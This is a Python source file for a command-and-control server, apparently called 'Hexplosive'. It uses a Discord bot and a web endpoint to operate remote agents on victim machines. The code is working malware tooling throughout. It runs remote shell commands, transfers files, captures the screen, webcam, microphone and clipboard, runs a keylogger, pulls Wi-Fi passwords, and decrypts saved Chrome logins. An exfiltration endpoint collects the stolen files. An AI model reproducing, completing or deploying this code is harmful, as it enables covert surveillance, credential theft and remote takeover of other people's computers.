#!/usr/bin/python3

import socket
import json
import base64
import asyncio
from datetime import datetime
import discord
from discord.ext import commands
import io
from typing import Optional
import sqlite3
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import os
from quart import Quart, request

DISCORD_TOKEN = "<placeholder for your discord bot token>"
SERVER_ID = 0 #<placeholder for your discord server ID>

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()
pem_public_key = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

bot = commands.Bot(command_prefix="hexp ", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print("Hexplosive server is running... ;)")
    global myListener
    myListener = Listener("0.0.0.0", 0000)
    await bot.change_presence(status=discord.Status.offline)
    await myListener.listen_for_connections()

@bot.command()
async def docs(ctx):
    try:
        with open("commands.png", 'rb') as f:
            await ctx.send(file=discord.File(f, filename="commands.png"))
    except Exception as e:
        await ctx.reply(f"Couldn't send command docs: {e}")

@bot.command()
async def exec(ctx, *, command):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, command)
        if output == None:
            await ctx.send("[-] An error occured when executing the command")
            return
        elif output == "":
            await ctx.send("[+] Command executed successfully")
            return
        elif output is True:
            await ctx.send(f"[+] Changed directory to `{command.split()[1]}`")
            return
        elif output is False:
            await ctx.send(f"[-] Directory `{command.split()[1]}` does not exist")
            return
        if len(output) > 1950:
            while output:
                segment = output[:1950]
                output = output[1950:]
                await ctx.send(segment)
        else:
            if len(output) > 0:
                await ctx.send(output)
            else:
                await ctx.send("Output is empty")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def download(ctx, path: Optional[str]):
    if not path:
        await ctx.send("[-] You need to provide the filepath of a resource to download.")
        return

    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        await ctx.send("Downloading file...")
        output = await myListener.execute_remotely(channel_name, f"J3hX7rQ5nW8mV2zT1kL9 https://<placeholder.your.domain.name>/form/ {path}")
        if output is None:
            await ctx.send(f"File `{path}` does not exist")
        elif output is False:
            await ctx.send("[-] File is larger than 25mb")
        elif output == "N3xL8T4rQ1P7yK2":
            await ctx.send(f"[+] Successfully downloaded `{path}`")
        elif output == "F9xM1T2rL8P4yJ5":
            await ctx.send("[-] Download failed.")
        else:
            await ctx.send(output)
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def upload(ctx, path: Optional[str], attachment: Optional[discord.Attachment]):
    if not attachment or not path: # checks whether file is attached
        await ctx.reply("[-]  You need to attach a file and provide a path to upload to.")
        return
    
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        await ctx.send("Uploading file...")
        fileBytes = await attachment.read()
        uploadPath = os.path.join("/var/www/html/guide", attachment.filename)
        await ctx.send(await upload_to_server(uploadPath, fileBytes))

        result = await myListener.execute_remotely(channel_name, f"G5tH9wE2zR8vY1xQ7pM4 https://<placeholder.your.domain.name>/guide/{attachment.filename} {path}")
        os.remove(uploadPath)
        if result == "A7xL9Q2rT4M1wK8":
            await ctx.send("[+] Successfully uploaded file.")
        elif result == "J3rL8T2xP9M1yK4":
            await ctx.send("[-] Path does not exist.")
        elif result == "K7T2xQ1L8P5yJ0F":
            await ctx.send(f"[-] Insufficient permissions to write file to {path}.")
        else:
            await ctx.send(result)
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def ss(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        await ctx.send("Taking screenshot...")
        output = await myListener.execute_remotely(channel_name, "B8vT3kR1mW9jQ7xL2yF")
        if output is None:
            await ctx.send("An error occurred on the agent when taking a screenshot.")
            return
        
        fileBytes = base64.b64decode(output)
        
        await ctx.send(file=discord.File(io.BytesIO(fileBytes), filename="screenshot.png"))
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def on_cam(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "Z4nJ7rX5pQ1wV8mL2kT")
        if output is None:
            await ctx.send("Failed to turn on webcam.")
            return
        
        fileBytes = base64.b64decode(output)
        
        await ctx.send(file=discord.File(io.BytesIO(fileBytes), filename="webcam.png"))
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def steal_wifi(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        wifiNetworks = await myListener.execute_remotely(channel_name, "H9yR2xP6mV1Q4wT7zB8 netsh wlan show profile")
        if wifiNetworks is None:
            await ctx.reply("[-] This feature only works on Windows targets.")
            return

        table = ""
        maxWifiLength = max(len(wifi[0]) for wifi in wifiNetworks)
        maxPwLength = max(len(pw[1]) for pw in wifiNetworks)
        separatorLength = maxWifiLength + maxPwLength + 20

        table += "-" * (separatorLength) + "\n"
        table += f"| {'**WIFI**':^{36}} | {'**PASSWORD**':^{36}} |\n"
        table += '-' * (separatorLength) + "\n"

        for wifi, pw in wifiNetworks:
            table += f"| \t {wifi:<{32-len(wifi)}} | {pw:^{40-len(pw)}}|\n"
        table += '-' * (separatorLength) + "\n"

        await ctx.send(table)
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def steal_browser(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "K5xL8rT2Q9mJ1vW3yP7 \nAppData\\Local\\Google\\Chrome\\User Data\\Local State\nAppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\nos_crypt\nencrypted_key")
        if output is None:
            await ctx.send("[-] This feature only works on Windows targets.")
            return
        elif type(output) is str:
            await ctx.send(output)
            return
        secretKey = base64.b64decode(output[0])
        loginData = base64.b64decode(output[1])
        loginDataFile = f"{ctx.channel.name}-login-data"

        with open(loginDataFile, "wb") as file:
            file.write(loginData)

        conn = sqlite3.connect(loginDataFile)
        cursor = conn.cursor()
        loginData = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

        cursor.close()
        conn.close()

        userCredentials = ""
        for row in loginData:
            url, username, password = row[0], row[1], row[2]
            if url and username and password:
                IV = password[3:15]
                encryptedPassword = password[15:-16]

                cipher = AES.new(secretKey, AES.MODE_GCM, IV)
                decryptedPassword = cipher.decrypt(encryptedPassword).decode()
                userCredentials += '-' * 45 + '\n'
                userCredentials += f"URL: {url} \nUsername: {username} \nPassword: {decryptedPassword}\n"
    
        if userCredentials:
            userCredentials = "**Google Chrome Credentials Harvested:**\n" + userCredentials
            userCredentials += '-' * 45 + '\n'
            await ctx.send(userCredentials)
        else:
            await ctx.reply("[ ERROR ]      No Google Chrome credentials were found")

    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def start_keylogger(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "F7wR4xJ1Q8mT2kL9yP6")
        if output == "Q1xM4T2L9P7rK5yJ3V6F0N8xBL3T5xQ9rM1P":
            await ctx.send("[+] Keylogger started.")
        else:
            await ctx.send("[-] Keylogger is already running.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def stop_keylogger(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "N3zK8rV1xQ5T2mW7yP4")
        if output == "D8xL2T1rQ9mP4wK5V7J0F3N6x":
            await ctx.send("[+] Keylogger stopped")
        else:
            await ctx.send("[-] Keylogger is not running.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def get_keylogs(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        await ctx.send("Retrieving keylogs...")
        output = await myListener.execute_remotely(channel_name, "M9jT2rL7Q4xV1wK8yP5")
        if output is None:
            await ctx.send("[-] No keylogs found.")
            return
        
        keylog_content = ''.join(output[0])
        max_line_length = 80  
        
        special_key_map = {
            "[ENTER]": "⏎",      
            "[SHIFT]": "⇧",      
            "[BACKSPACE]": "⌫",  
            "[CTRL]": "⌃",       
            "[ALT]": "⎇",        
            "[TAB]": "⇥",       
            "[ESC]": "⎋",        
            "[DELETE]": "⌦",     
            "[UP]": "↑",         
            "[DOWN]": "↓",       
            "[LEFT]": "←",       
            "[RIGHT]": "→",  
            "[SPACE]": " "
        }

        for key, value in special_key_map.items():
            keylog_content = keylog_content.replace(key, value)

        # Split the keylog content into lines of max_line_length characters
        formatted_content = '\n'.join(
            keylog_content[i:i + max_line_length] for i in range(0, len(keylog_content), max_line_length)
        )
        keylog_report = (
            f"Start Time: {output[1]}\n"
            f"Stop Time: {output[2]}\n\n"
            f"{formatted_content}"
        )
        
        await ctx.send(file=discord.File(io.BytesIO(keylog_report.encode()), filename="keylogs.txt"))
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def start_voice(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return

        output = await myListener.execute_remotely(channel_name, "X1rM6wQ9T2kL7yP4vJ8")
        if output == "J9xT1rM4L8P2wK7V3yF0Q5N6xR":
            await ctx.send("[+] Voice recording started.")
        else:
            await ctx.send("[-] Voice recording is already in progress.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def stop_voice(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return

        await ctx.send("Generating Voice Recording...")
        output = await myListener.execute_remotely(channel_name, "P8T3xQ1mL7rV4wK9yJ2")
        if output is None:
            await ctx.send("[-] No voice recordings active at the moment.")
            return

        audio_data = base64.b64decode(output)
        timestamp = datetime.now().strftime("%d-%m-%Y_%I.%M%p")
        filename = f"{timestamp}.wav"
        await ctx.send(file=discord.File(io.BytesIO(audio_data), filename=filename))
        await ctx.send("[+] Voice recording stopped and saved.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def rec_screen(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        
        output = await myListener.execute_remotely(channel_name, "L4kR9xQ2mT1wJ7yP8V5 https://<placeholder.your.domain.name>/form/")
        if output == "K3T1rL7xQ8mP9yV4wJ0F5N2xL6B8R":
            await ctx.send("[+] Screen recording started.")
        elif output is None:
            await ctx.send("[-] This feature only works on Windows targets.")
        else:
            await ctx.send("[-] Screen recording is already running.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def stop_rec_screen(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        
        output = await myListener.execute_remotely(channel_name, "A5xN2rM9Q8T1kL7wV3J")
        if output == "F1xQ8rL2T9mW4yP7K3V6J0B5N2xR8T":
            await ctx.send("[+] Stopped screen recording.")
        else:
            await ctx.send("[-] No screen recording is currently running.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def status_rec_screen(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        
        output = await myListener.execute_remotely(channel_name, "C4rM8T2Q7xJ1wL9yV5K")
        if output == "True":
            await ctx.send("Screen recording is running.")
        else:
            await ctx.send("Screen recording is NOT running.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def kill_agent(ctx):
    channel_name = ctx.channel.name
    await ctx.send(await myListener.kill_agent(channel_name))

@bot.command()
async def destroy_agent(ctx): #add this function
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        confirm = await ctx.send("Destroy the agent? (Y/N)")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            while True:
                msg = await bot.wait_for('message', check=check, timeout=30)
                if msg.content.upper() == "Y":
                    output = await myListener.execute_remotely(channel_name, "D1xP9Q4T7mL8rW2yK5V")
                    if output == "X7pL3mQ9rT2V5yJ8K1wF4N6xR0B":
                        await ctx.send("Agent destroyed successfully.")
                    else:
                        await ctx.send(output)
                    break
                elif msg.content.upper() == "N":
                    await ctx.send("Task cancelled. Agent script was not destroyed.")
                    break
                else:
                    await ctx.send("Invalid response: Please reply with 'Y' or 'N'.")
        except asyncio.TimeoutError:
            await ctx.send("Timed out. Agent script was not destroyed.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def sysinfo(ctx):
    try:
        channel_name = ctx.channel.name
    except:
        channel_name = ctx.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "E8T3rL1Q2xW7mV9yK4P")
        if type(output) is str:
            await ctx.send(output)
            return
        info = ["Public IP", "Model", "User", "OS", "Machine", "Node", "Release", "Version", "Username", "Privileges", "MAC Address"]
        if output[3].lower() == "windows":
            if output[-2] == 1:
                output[-2] = "Administrator"
            else:
                output[-2] = "Normal User"
        elif output[3].lower() == "linux":
            if output[-2] is True:
                output[-2] = "Root"
            else:
                output[-2] = "Normal User"
        myListener.permissions[channel_name] = output[-2]

        i = 0
        while i < len(info):
            info[i] = info[i] + ': ' + str(output[i])
            i += 1
        info = '\n'.join(info)
        info = "```SYSTEM INFORMATION\n\n" + info + "```"
        await ctx.send(info)
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")


@bot.command()  
async def scan_proc(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "ql5DgQrCj4G8pm6yXGvPh7lq")
        if type(output) is str:
            await ctx.send(output)
        elif output == True:
            await ctx.send("[WARNING] Blacklisted processes are found running.")
        elif output == False:
            await ctx.send("No blacklisted processes are running.")
        else:
            await ctx.send("Unexpected output received.")

    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()  
async def capture_clipboard(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "D1sZ3bF")

        if len(output) > 1950:
            while output:
                segment = output[:1950]
                output = output[1950:]
                await ctx.send(segment)
        else:
            if len(output) > 0:
                await ctx.send(output)
            else:
                await ctx.send("Output is empty")        
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()  
async def monitor_system_performance(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "G7t8R4pL9nQw2kVx0m")
        if type(output) is str:
            await ctx.send(output)
            return
        
        output = base64.b64decode(output[0])
        await ctx.send(file=discord.File(io.BytesIO(output), filename="usb.txt"))
        return output
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

@bot.command()
async def check_hash(ctx):
    channel_name = ctx.channel.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "hash")
        if output == None:
            await ctx.send("File not found")
            return
        if output.lower() == myListener.hash_value.lower():
            await ctx.send("[+] Integrity check passed! The script remains unchanged.")
            return
        else:
            await ctx.send("[-] Integrity check failed! The script has been tampered with")
            return
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")

# Recce Agent commands
@bot.command()
async def get_dir(ctx):
    try:
        channel_name = ctx.channel.name
    except:
        channel_name = ctx.name
    try:
        if channel_name not in myListener.connections:
            await ctx.reply(f"[-] {channel_name} is not active")
            return
        output = await myListener.execute_remotely(channel_name, "getdirhash")
        if isinstance(output, list):
            await ctx.send("[+] List of Files in `C:/Program Files`:")
            for file in output:
                await ctx.send(file)
            return
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")  
        
# c2-generator.py command
# @bot.command()
# async def gen_agent(ctx):
#     try:
#         channel_name = ctx.channel.name
#     except:
#         channel_name = ctx.name
#     try:
        
        
        
@bot.command()
async def sessions(ctx):
    await ctx.send(myListener.list_agents())

async def upload_to_server(uploadPath, content):
    print(uploadPath)
    try: 
        with open (uploadPath, "wb") as file:
            file.write(content)
            return "[+] Successfully uploaded file to web server, agent is retrieving the file..."
    except Exception as e:
        return f"An error occurred when uploading file to the Kali server: \n{e}"

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen()
        self.listener.setblocking(False)
        print("[+] Waiting for incoming connections")

        self.connections = {}
        self.permissions = {}
        self.peer_keys = {} #add this
        self.peer_key = None
        self.hash_value = "<placeholder for your hash of google_chrome.exe agent>"

    async def listen_for_connections(self):
        loop = asyncio.get_event_loop()
        while True:
            conn, addr = await loop.sock_accept(self.listener)
            await self.serialize_send(conn, "hostname")
            hostname = await self.serialize_receive(conn)
            hostname = hostname.strip().lower()
            for char in hostname:
                if not char.isalnum():
                    hostname = hostname.replace(char, '-')

            if hostname in self.connections: #add this
                channel = await self.create_discord_channel(hostname)

                await channel.send(await self.kill_agent(hostname))
                del self.peer_keys[hostname]

            channel = await self.create_discord_channel(hostname)
            await channel.send(f":white_check_mark: Connection received from **< {hostname}  {addr} >**... Hexplosive is ready ;)")
            self.connections[channel.name] = (conn, addr)
            print(f"[+] Got a connection from {hostname} at {addr}")
            await self.serialize_send(conn, pem_public_key)
            pem_peer_key = await self.serialize_receive(conn)
            pem_peer_key = pem_peer_key.encode('utf-8')
            self.peer_key = serialization.load_pem_public_key(pem_peer_key)
            self.peer_keys[hostname] = self.peer_key #add this
            await sysinfo(channel)

    async def create_discord_channel(self, hostname):
        server = bot.get_guild(SERVER_ID)
        channelExists = discord.utils.get(server.channels, name=hostname.lower())
        if not channelExists:
            overwrites = {
            server.default_role: discord.PermissionOverwrite(read_messages=False),
            server.owner: discord.PermissionOverwrite(read_messages=True)
            }
            channel = await server.create_text_channel(hostname, overwrites=overwrites)
        else:
            channel = bot.get_channel(channelExists.id)
        return channel

    async def serialize_send(self, conn, data):
        jsonData = json.dumps(data)
        await asyncio.get_event_loop().sock_sendall(conn, jsonData.encode())

    async def serialize_receive(self, conn):
        jsonData = b""
        while True:
            try:
                jsonData += await asyncio.get_event_loop().sock_recv(conn, 1024)
                return json.loads(jsonData.decode())
            except (ValueError):
                continue
            except (ConnectionResetError, ConnectionAbortedError):
                raise

    async def execute_remotely(self, channel_name, command):
        try:
            conn, addr = self.connections[channel_name]
            self.peer_key = self.peer_keys[channel_name] #add this
            max_chunk_size = 190
            command = command.encode()
            if len(command) > max_chunk_size:
                chunks = [command[i:i + max_chunk_size] for i in range(0, len(command), max_chunk_size)]
                encrypted_command = []
                for chunk in chunks:
                    encrypted_chunk = self.peer_key.encrypt(
                        chunk,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    encrypted_command.append(base64.b64encode(encrypted_chunk).decode('utf-8'))
                await self.serialize_send(conn, encrypted_command)
            else:
                encrypted_command = self.peer_key.encrypt(
                    command,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                encrypted_command = base64.b64encode(encrypted_command).decode('utf-8')
                await self.serialize_send(conn, encrypted_command)

            encrypted_output = await self.serialize_receive(conn)
            if isinstance(encrypted_output, list):
                decrypted_output = []
                for encrypted_output in encrypted_output:
                    encrypted_chunk = base64.b64decode(encrypted_output)
                    decrypted_chunk = private_key.decrypt(
                        encrypted_chunk,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    decrypted_output.append(decrypted_chunk)
                decrypted_output = b''.join(decrypted_output)
                return json.loads(decrypted_output.decode())
            
            elif encrypted_output is None:
                pass
            else:
                encrypted_output = base64.b64decode(encrypted_output)
                decrypted_output = private_key.decrypt(
                    encrypted_output,
                    padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                    )
                )
                return json.loads(decrypted_output.decode())

        except (ConnectionResetError, ConnectionAbortedError) as e:
            if channel_name in self.connections:
                if conn:
                    conn.close()
                channel = bot.get_channel(discord.utils.get(bot.get_guild(SERVER_ID).channels, name=channel_name).id)
                await channel.send(f"Target `{channel_name} {addr}` has disconnected.")
                del self.connections[channel_name]
                del self.permissions[channel_name]
                del self.peer_keys[channel_name] #add this
            raise

    def list_agents(self):
        agentNum = 0
        output = "**Active Targets:**\n__#__\t__Target Info__\n"
        for hostname, (conn, addr) in self.connections.items():
            if hostname not in self.permissions:
                self.permissions[hostname] = "Unknown"
            output += f"{agentNum}\t{hostname} {addr}\t|\t{self.permissions[hostname]} Privileges\n"
            agentNum += 1
        return output
    
    async def kill_agent(self, channel_name):
        try:
            conn, addr = self.connections[channel_name]
            await self.serialize_send(conn, base64.b64encode(self.peer_key.encrypt(
                    "4fT9kB7mR2xQ6wL1yP8jA".encode(),
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )).decode())
            channel = await self.create_discord_channel(channel_name)
            await channel.send("Stopping C2 agent...")
            conn.close()
            del self.connections[channel_name]
            del self.permissions[channel_name]
            return f"Closed connection with {channel_name} {addr}."
        except Exception as e:
            return f"An error occured when trying to kill the agent:\n{e}"
        


app = Quart(__name__)
app.config['MAX_CONTENT_LENGTH'] = 30 * 1024 * 1024


@app.route("/form/", methods=['POST'])
async def download_from_request():
    try:
        targetHostname = request.headers.get("X-Forwarded-Host")
        for char in targetHostname:
            if not char.isalnum():
                targetHostname = targetHostname.replace(char, '-')
        channel = bot.get_channel(discord.utils.get(bot.get_guild(SERVER_ID).channels, name=targetHostname).id)
        files = await request.files
        file = files['file'].read()
        filename = files['file'].filename
        if filename == "file":
            filename = "screen_recording.mp4"
        await channel.send(file=discord.File(io.BytesIO(file),filename=filename))
        return "Form submission was successful."
    except Exception as e:
        print(str(e))
        return "Oops, something went wrong. Please try again later."



async def main():
    try:
        await asyncio.gather(
            asyncio.create_task(bot.start(DISCORD_TOKEN)),
            asyncio.create_task(await app.run_task())
        )
    except TypeError:
        print("\nShutting down C2 server...")


asyncio.run(main())
